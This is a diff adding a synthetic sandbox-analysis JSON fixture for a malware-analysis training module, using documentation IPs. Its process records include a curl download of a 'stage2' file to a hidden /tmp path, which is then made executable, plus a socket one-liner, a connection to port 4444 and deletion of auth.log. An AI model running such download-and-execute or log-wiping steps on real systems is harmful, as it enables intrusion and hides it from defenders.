@@ -1,0 +1,19 @@
+{
+  "_comment": "Synthetic dynamic-analysis result for Module 3.4. Same shape Detonate's sandbox produces. All IOCs are inert (RFC 5737 doc IPs, example.com).",
+  "processes": [
+    { "command": "/bin/sh", "args": ["-c", "curl http://192.0.2.50/stage2 -o /tmp/.x"] },
+    { "command": "curl", "args": ["http://192.0.2.50/stage2", "-o", "/tmp/.x"] },
+    { "command": "chmod", "args": ["+x", "/tmp/.x"] },
+    { "command": "python3", "args": ["-c", "import socket; ..."] }
+  ],
+  "network": {
+    "dns": [{ "query": "c2.example.com" }],
+    "connections": [
+      { "dst_ip": "192.0.2.50", "dst_port": 80, "protocol": "tcp" },
+      { "dst_ip": "192.0.2.99", "dst_port": 4444, "protocol": "tcp" }
+    ]
+  },
+  "files_created": ["/tmp/.x"],
+  "files_modified": [],
+  "files_deleted": ["/var/log/auth.log"]
+}
